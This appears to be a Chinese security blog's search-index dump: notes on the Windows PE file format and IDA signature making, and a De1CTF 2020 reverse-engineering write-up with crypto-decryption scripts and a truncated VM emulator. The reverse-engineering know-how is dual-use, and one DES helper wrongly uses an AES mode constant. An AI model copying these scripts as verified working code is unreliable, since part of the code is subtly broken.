","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:2:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"PE基本结构 DOS头: IMAGE_DOS_HEADER DOS存根：大小不固定，即使没有也可以正常运行 NT头: IMAGE_NT_HEADERS（签名、文件头、可选头） 节区头: IMAGE_SECTION_HEADER(一个节区一个) PE体(各个节区) ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"DOS头 typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER; e_magic: DOS签名，4D5A(MZ) e_lfanew: 指示NT头偏移 ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:4:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"DOS存根 是个可选项，且大小不固定，即使没有DOS stub，文件也能正常运行，DOS stub由代码和数据混合而成，用于在DOS系统中运行，输出\"This program cannot be run in DOS mode\" ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:5:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"NT头 typedef struct _IMAGE_NT_HEADERS { DWORD Signature; // 签名50450000h IMAGE_FILE_HEADER FileHeader; // 文件头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // 可选头 } IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32; ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:6:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"NT头: 文件头 typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER; Machine 每个CPU具有唯一的Machine码 #define IMAGE_FILE_MACHINE_UNKNOWN 0 #define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386 #define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian #define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian #define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian #define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2 #define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP #define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian #define IMAGE_FILE_MACHINE_SH3DSP 0x01a3 #define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian #define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian #define IMAGE_FILE_MACHINE_SH5 0x01a8 #define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM little-endian #define IMAGE_FILE_MACHINE_ARMV7 0x01c4 #define IMAGE_FILE_MACHINE_ARMNT 0x01c4 #define IMAGE_FILE_MACHINE_THUMB 0x01c2 #define IMAGE_FILE_MACHINE_AM33 0x01d3 #define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian #define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1 #define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64 #define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS #define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64 #define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS #define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS #define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 #define IMAGE_FILE_MACHINE_TRICORE 0x0520 #define IMAGE_FILE_MACHINE_CEF 0x0CEF #define IMAGE_FILE_MACHINE_EBC 0x0EBC #define IMAGE_FILE_MACHINE_AMD64 0x8664 #define IMAGE_FILE_MACHINE_M32R 0x9041 #define IMAGE_FILE_MACHINE_CEE 0xc0ee Characteristics 用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息，以bit OR形式组合起来，比较重要的是0002h和2000h #define IMAGE_FILE_RELOCS_STRIPPED 0x0001 //重定位 #define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // 可执行文件 #define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // 行号信息 #define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // 符号信息 #define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 #define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 #define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 #define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32位 #define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // 调试信息 #define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 #define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 #define IMAGE_FILE_SYSTEM 0x1000 #define IMAGE_FILE_DLL 0x2000 // DLL文件 #define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 #define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:6:1","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"NT头: 可选头 typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY; #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 typedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32; Magic 为IMAGE_OPTIONAL_HEADER32结构体时，Magic码为10B，为IMAGE_OPTIONAL_HEADER64结构体时，Magic码为20B AddressOfEntryPoint 持有EP的RVA值，该值指出程序最先执行的代码起始地址，相当重要 ImageBase 程序优先装入的地址，EXE、DLL文件被装载到用户内存的0~0x7FFFFFFF， SYS文件载入内核内存的0x80000000~FFFFFFFF中。EIP寄存器的值开始为ImageBase+AddressOfEntryPoint SectionAlignment, FileAlignment FileAlignment指定了节区在磁盘文件中的最小单位，SectionAlignment指定了节区在内存中的最小单位，磁盘文件或内存的节区大小必定为FileAlignment或SectionAlignment的整数倍 SizeOfImage 指定PE Image在虚拟内存中所占空间的的大小 SizeOfHeaders 用来指出整个PE头的大小，该值必须为FileAlignment的整数倍。第一节区所在的位置与SectionOfHeaders距文件开始偏移的量相同 SubSystem 用来区分系统驱动文件与普通的可执行文件，Subsystem成员可以拥有的值如下: 0x1: Driver文件，系统驱动 0x2: GUI文件，窗口应用程序 0x3: CUI文件，控制台应用程序 NumberOfRvaAndSizes 用来指定DataDirectory数组的个数，虽然结构体定义中明确的指出了数组的个数为IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)，但是PE装载器通过查看NumberOfRvaAndSize值来识别数组大小，换言之，数组的大小也不一定是16 DataDirectory 是由IMAGE_DATA_DIRECTORY结构体组成的数组，数组的每一项都有被定义的值。 DataDirectory[0] = EXPORT Directory DataDirectory[1] = IMPORT Directory DataDirectory[2] = RESOURCE Directory DataDirectory[3] = EXCEPTION Directory DataDirectory[4] = SECURITY Directory DataDirectory[5] = BASERELOC Directory DataDirectory[6] = DEBUG Directory DataDirectory[7] = COPYROGHT Directory DataDirectory[8] = GLOBALPTR Directory DataDirectory[9] = TLS Directory DataDirectory[a] = LOAD_CONFIG Directory DataDirectory[b] = BOUND_IMPORT Directory DataDirectory[c] = IAT Directory DataDirectory[d] = DELAY_IMPORT Directory DataDirectory[e] = COM_DESCRIPTOR Directory DataDirectory[f] = Reserved Directory ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:6:2","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"节区头 PE文件中的code, data, resource按照不同属性分类存储在不同的节区 #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER; 主要成员以及含义如下 成员 含义 VirtualSize 内存中节区所占大小 VirtualAddress 内存中节区起始地址(RVA) SizeOfRawData 磁盘文件中节区所占大小 PointerToRawData 磁盘文件中节区起始地址 PE文件加载到内存时，每个节区必须准确完成内存地址与文件偏移的映射，即RVA to RAW RAW - PointerToRawData = RVA - VirtualAddress RAW = RVA - VirtualAdress + PointerToRawData Characteristic | 节区属性(bit OR) Characteristic的值由如下值组合而成(bit OR) #define IMAGE_SCN_CNT_CODE 0x00000020 #define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 #define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 #define IMAGE_SCN_MEM_EXECUTE 0x20000000 #define IMAGE_SCN_MEM_READ 0x40000000 #define IMAGE_SCN_MEM_WRITE 0x80000000 Name成员并不像一般c字符串一样用NULL结尾，而且没有“必须使用\"ASIC\"值的限制，PE规范并没有规定节区的name，所以名称并不能保证其百分之百被用作某种信息。 ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:7:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"IAT IAT: Import Address Table 导入地址表。IAT是用来记录程序正在使用哪些库中的哪些函数。 DLL特征: 不要把库包含到程序中，单独组成DLL文件，需要时调用即可。 内存映射技术使加载后的DLL代码、资源在多个进程中实现共享。 更新库时只需要替换相关DLL文件即可 加载DLL的方式有两种，一种是显式链接(Explicit Linking)，程序使用DLL时加载使用完毕后释放内存；另一种是隐式链接(Implicit Linking)，程序开始时即一同加载DLL，程序终止时再释放占用的内存。IAT提供的机制与隐式链接有关。 IMAGE_IMPORT_DESCRIPTOR typedef struct _IMAGE_IMPORT_DESCRIPTOR { __C89_NAMELESS union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; // 库中函数的固有编号 BYTE Name[1]; } IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME; OriginalFirstThunk: INT(Import Name Table) address(RVA)INT地址 Name: library name string address(RVA)库名称字符串地址 FirstThunk: IAT(Import Address Table) address(RVA)IAT地址 INT与IAT是长整型数组，以NULL结束(未明确指出大小) INT中个元素的值为IMAGE_IMPORT_BY_NAME结构体指针 INT与IAT大小应该相同 执行一个普通的程序时往往需要导入多个库，导入多少库就存在多少个IMAGE_IMPORT_DESCRTPTOR结构体，这些结构体组成了数组，且结构体数组最后以NULL结构体结尾，数组的起始地址在NT可选头中的DataDirectory[1] = IMPORT Directory中 从图中可以看到KERNEL32.dll的INT数组VA为70d68，看一下70d68的内容: 是一个地址数组，查看数组中的第一个地址: 是IMAGE_IMPORT_BY_NAME结构体 KERNEL32.dll的IAT地址为1130，查看1130处的内容: IDA中是静态还没载入的时候，看一下OD中的: PE装载器把导入函数输入至IAT的过程： 1. 读取IID的Name成员，获取库名称字符串 2. 装载相应库: -\u003e LoadLibrary(\"kernel32.dll\") 3. 读物IID的OriginalFirstThunk成员，获取INT地址 4. 逐一读取INT数组中的值，获取相应IMAGE_IMPORT_BY_NAME地址(RVA) 5. 使用IMAGE_IMPORT_BY_NAME的Hint(Ordinal)或Name项，获取相应函数的起始地址。 -\u003e GetProcAddress(\"GetCurrentThreadId\") 6. 读取IID的FirstThunk(IAT)成员，获取IAT地址 7. 将上面获得的函数地址输入相应的IAT数组值 8. 重复4-7直到INT结束(NULL) ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:8:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"EAT EAT是一种核心机制，它使不同的应用程序可以调用库文件中提供的函数，也就是说只有通过EAT才能准确求得从相应库中导入函数的起始地址。IMAGE_EXPORT_DIRECTORY结构体中保存着导出信息，且PE文件中有且仅有一个用来说明库EAT的IMAGE_EXPORT_DIRECTORY结构体，结构体的地址记录在可选头中的DataDirectory[0] = EXPORT Directory，IAT中的IMAGE_IMPORT_DIRECTORY结构体以数组的形式存在，且拥有多个成员，这样是因为PE文件可以导入多个库 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; // address of library file name DWORD Base; // ordinal base DWORD NumberOfFunctions; // 实际Export函数的个数 DWORD NumberOfNames; // Export函数中具名函数的个数 DWORD AddressOfFunctions; // Export函数地址数组(数组元素个数=NumberOfFunctions) DWORD AddressOfNames; // 函数名称地址数组(数组元素个数=NumberOfNames) DWORD AddressOfNameOrdinals; // Ordinal地址数组(数组元素个数=NumberOfNames) } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY; 从库中获取函数地址的API为GetProcAddress函数，该API引用EAT来获取指定API的地址，GetProcAddress()API拥有函数名称，下面是获取函数地址的过程: 1. 利用AddressOfNames成员转到`函数名称数组` 2. `函数名称数组`中存储着字符串地址，通过比较字符串，查找指定函数名称 3. 利用AddressOfNameOrdinals成员转到ordinal数组 4. 在ordinal数组中通过name_index查找相应ordinal值 5. 利用AddressOfFunctions成员转到`函数地址数组(EAT)` 6. 在EAT中将刚刚得到的ordinal值用作地址索引，获取指定函数的起始地址。 kernel32.dll的EAT: 看一下函数名称数组: AddAtomW函数的Index是5，转到ordinal数组: 可以看到index等于5的ordinal等于8，查看函数地址数组: 可以看到EAT中index等于8的就是AddAtomW函数地址。 ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:9:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"https://blog.csdn.net/Breeze_CAT/article/details/103788796 工具: flair ./pelf libc.a libc.pat #如果这句话报错: Unknown relocation type 42 (offset in section=0x16).那么要加一个参数： ./pelf -r42:0:0 libc.a libc.pat #如果有出现别的错误，继续添加这个参数 -r错误号:0:0 ./sigmake libc.pat libc.sig 然后查看是否成功，有时没有成功就是文件中签名有冲突，这时不会生成.sig而是生成了一个.exc文件 大概意思就是有些模块的签名是一样的，我们要选择使用哪个，看红框中的内容，大体意思就是在想要选择的模块前面标记’+’，在不确定的选择前面标’-’，什么也不做就会排除这个模块，最后要删掉这四行内容。 ","date":"2020-05-14","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%A4%A9-sig%E5%88%B6%E4%BD%9C/:0:0","tags":null,"title":"sig制作","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%A4%A9-sig%E5%88%B6%E4%BD%9C/"},{"categories":["writeup"],"content":"parser 这道题挣扎的做出来了，但是我看了别人的wp之后发现我密码学真的很差== ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:1:0","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"flag格式检查 程序首先把输入进行拆分，分为De1CTF, {, strs, _, +, … ,}, \\n这几个部分，所以flag的格式是De1CTF{str+'_/+'+str+...}，拆分以后对括号里面的内容进行加密运算，加密的方式有三种，分别是RC4, DES和AES, 其中每一个被_ or +分开的字符部分都要做RC4, 然后_是DES运算, +是AES运算，_的优先级高于+。 ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:1:1","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"solve RC4 RC4的解密部分很好写，密钥就是De1CTF def de_rc4(s,k): ci = ARC4.new(k) return ci.decrypt(s) DES 菜的部分来了，首先我看到它padding了一部分，padding的内容是padding的长度，然后异或了一个东西，然后8字节一加密，密钥是De1CTF\\x02\\x02，然后8字节加密完成之后，加密的结果又与下一个8字节以后后在加密，然后我按照这个过程写的script，就这样我都没看出来这是个CBC模式的加密==我真的是服了自己了，菜哭了。就这样我也配说我学过密码学==还是刷刷Crypto吧 def padding(s,n): len1 = len(s) n1 = len1 % n s += chr(n-n1)*(n-n1) return s def de_des_cbc(s,k): if len(s) % 8 != 0: s = padding(s,8) key = padding(k,8) iv = key ci = DES.new(key,AES.MODE_CBC,iv) return ci.decrypt(s) # out = '' # for i in range(len(s)/8): # ci = DES.new(key,DES.MODE_ECB) # m1 = ci.decrypt(s[8*i:8*i+8]) # out += xor_str(m1,iv) # iv = s[8*i:8*i+8] # return out def en_des_cbc(s,k): s = padding(s,8) key = padding(k,8) iv = key ci = DES.new(key, DES.MODE_CBC,iv) return ci.encrypt(s) # out = '' # for i in range(len(s)/8): # ci = DES.new(key,DES.MODE_ECB) # m1 = xor_str(s[8*i:8*i+8],iv) # iv = ci.encrypt(m1) # out += iv # return out AES 一样的没看出来CBC==我不配我不配我不配 def padding(s,n): len1 = len(s) n1 = len1 % n s += chr(n-n1)*(n-n1) return s def de_aes_cbc(s,k): if len(s) % 16 != 0: s = padding(s,16) key = padding(k,16) iv = key ci = AES.new(key,AES.MODE_CBC,iv) return ci.decrypt(s) def en_aes_cbc(s,k): s = padding(s,16) key = padding(k,16) iv = key ci = AES.new(key,AES.MODE_CBC,iv) return ci.encrypt(s) ","date":"2020-05-07","objectID":"/de1ctf-2020-re/:1:2","tags":null,"title":"De1CTF-2020--re","uri":"/de1ctf-2020-re/"},{"categories":["writeup"],"content":"FLw 这道题我没有仔细做，前面是学弟解析了一下，然后学长就做出来了，虚拟机有点特别，是基于队列的，一个是一个循环队列，跟我平时做的基于栈的还挺不一样的，这个故事告诉我们就也不一定是模仿程序执行的 from Queue import Queue from string import printable def vm(): pcode = '\\x3A\\x14\\x1C\\x34\\xFF\\x41\\x20\\x19\\x20\\x1A\\x20\\x1B\\x20\\x1C\\x20\\x1D\\x20\\x1E\\x20\\x1F\\x20\\x20\\x20\\x21\\x20\\x22\\x20\\x23\\x20\\x24\\x20\\x25\\x20\\x26\\x20\\x27\\x20\\x28\\x20\\x29\\x20\\x2A\\x20\\x2B\\x20\\x2C\\x20\\x2D\\x20\\x2E\\x20\\x2F\\x20\\x30\\x20\\x31\\x20\\x32\\x20\\x33\\x20\\x34\\x2A\\x19\\x14\\x44\\x34\\xFF\\x14\\x00\\x20\\xFF\\x2A\\x1A\\x14\\x65\\x34\\xFF\\x14\\x20\\x2A\\xFF\\x2A\\xFF\\x33\\x33\\x2B\\x30\\x14\\x21\\x2A\\xFF\\x2A\\xFF\\x33\\x33\\x2B\\x30\\x14\\x03\\x20\\xFE\\x2A\\xFF\\x14\\x03\\x35\\x2A\\xFE\\x14\\x3F\\x33\\x33\\x31\\x3A\\x2C\\x14\\x01\\x2A\\xFE\\x34\\x20\\xFE\\x2A\\xFE\\x40\\x17\\x2A\\xFF\\x14\\x01\\x33\\x20\\xFF\\x2A\\xFF\\x14\\x0A\\x34\\x40\\x3D\\x2A\\x1D\\x14\\x54\\x34\\xFF\\x2A\\x1E\\x14\\x46\\x34\\xFF\\x2A\\x1F\\x14\\x7B\\x34\\xFF\\x14\\x00\\x20\\xFF\\x36\\x15\\x2A\\xFF\\x14\\x40\\x33\\x2B\\x32\\x30\\x2A\\xFF\\x14\\x40\\x33\\x36\\x2C\\x2A\\xFF\\x14\\x01\\x33\\x20\\xFF\\x2A\\xFF\\x14\\x1E\\x34\\x40\\x1D\\x2A\\x1C\\x14\\x43\\x34\\xFF\\x2A\\x1B\\x14\\x31\\x34\\xFF\\x14\\x00\\x20\\xFF\\x14\\x00\\x14\\x00\\x30\\x30\\x2A\\xFF\\x14\\x40\\x2A\\xFF\\x14\\x41\\x33\\x33\\x2B\\x2B\\x34\\x30\\x2A\\xFF\\x14\\x41\\x33\\x36\\x2C\\x2A\\xFF\\x14\\x41\\x2A\\xFF\\x14\\x42\\x33\\x33\\x2B\\x2B\\x33\\x30\\x2A\\xFF\\x14\\x42\\x33\\x36\\x2C\\x2A\\xFF\\x14\\x40\\x2A\\xFF\\x14\\x42\\x33\\x33\\x2B\\x2B\\x37\\x30\\x2A\\xFF\\x14\\x40\\x33\\x36\\x2C\\x2A\\xFF\\x14\\x03\\x33\\x20\\xFF\\x2A\\xFF\\x14\\x1E\\x34\\x40\\x51\\x2A\\x34\\x14\\x7D\\x34\\xFF\\x2A\\x40\\x14\\x7A\\x34\\xFF\\x2A\\x41\\x14\\x19\\x34\\xFF\\x2A\\x42\\x14\\x4F\\x34\\xFF\\x2A\\x43\\x14\\x6E\\x34\\xFF\\x2A\\x44\\x14\\x0E\\x34\\xFF\\x2A\\x45\\x14\\x56\\x34\\xFF\\x2A\\x46\\x14\\xAF\\x34\\xFF\\x2A\\x47\\x14\\x1F\\x34\\xFF\\x2A\\x48\\x14\\x98\\x34\\xFF\\x2A\\x49\\x14\\x58\\x34\\xFF\\x2A\\x4A\\x14\\x0E\\x34\\xFF\\x2A\\x4B\\x14\\x60\\x34\\xFF\\x2A\\x4C\\x14\\xBD\\x34\\xFF\\x2A\\x4D\\x14\\x42\\x34\\xFF\\x2A\\x4E\\x14\\x8A\\x34\\xFF\\x2A\\x4F\\x14\\xA2\\x34\\xFF\\x2A\\x50\\x14\\x20\\x34\\xFF\\x2A\\x51\\x14\\x97\\x34\\xFF\\x2A\\x52\\x14\\xB0\\x34\\xFF\\x2A\\x53\\x14\\x3D\\x34\\xFF\\x2A\\x54\\x14\\x87\\x34\\xFF\\x2A\\x55\\x14\\xA0\\x34\\xFF\\x2A\\x56\\x14\\x22\\x34\\xFF\\x2A\\x57\\x14\\x95\\x34\\xFF\\x2A\\x58\\x14\\x79\\x34\\xFF\\x2A\\x59\\x14\\xF9\\x34\\xFF\\x2A\\x5A\\x14\\x41\\x34\\xFF\\x2A\\x5B\\x14\\x54\\x34\\xFF\\x2A\\x5C\\x14\\x0C\\x34\\xFF\\x2A\\x5D\\x14\\x6D\\x34\\xFF\\xAB' data = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=' queue = Queue(maxsize=100) mem = [0]*256 inpt = [0]*256 reg = 0 pc = 0 while True: code = ord(pcode[pc])-20 if code == 0: opnum = ord(pcode[pc+1]) queue.put(opnum) print '0x%02xcode %03dpush imm %d'%(pc,code,opnum) pc += 2 elif code == 1: opnum = queue.get() print '0x%02xcode %03dsimple pop %d'%(pc,code,opnum) pc += 1 elif code == 12: opnum1 = ord(pcode[pc+1]) opnum2 = queue.get() mem[opnum1] = opnum2 print '0x%02xcode %03dmem[%d] = %d'%(pc,code,opnum1,opnum2) pc += 2 elif code == 22: opnum = ord(pcode[pc+1]) queue.put(mem[opnum]) print '0x%02xcode %03dpush mem[imm %d] = %d'%(pc,code, opnum, mem[opnum]) pc += 2 elif code == 23: opnum = queue.get() queue.put(mem[opnum]) print '0x%02xcode %03dpush mem[queue %d] = %d'%(pc,code,opnum, mem[opnum]) pc += 1 elif code == 24: opnum1 = queue.get() opnum2 = queue.get() mem[opnum1] = opnum2\u00260xff print '0x%02xcode %03dmem[%d] = %d'%(pc,code,opnum1, opnum2\u00260xff) pc += 1 elif code == 28: reg = (queue.get() + (reg \u003c\u003c 8))\u00260xffff print '0x%02xcode %03dfetch %d'%(pc,code,reg) pc += 1 elif code == 29: opnum = ord(pcode[pc+1]) oreg = reg mod = reg % opnum queue.put(mod) reg /= opnum print '0x%02xcode %03d%d/%d=%d...%d'%(pc,code,oreg,opnum,reg,mod) pc += 2 elif code == 30: opnum = queue.get() queue.put(ord(data[opnum])) print '0x%02xcode %03dpush data[%d]=%d'%(pc,code,opnum,ord(data[opnum])) pc += 1 elif code == 31: opnum1 = queue.get() opnum2 = queue.get() queue.put(opnum1+opnum2) print '0x%02xcode %03d%d+%d=%d'%(pc,code,opnum2,opnum1,opnum2+opnum1) pc += 1 elif code == 32: opnum1 = queue.get() opnum2 = queue.get() queue.put(opnum2-opnum1) 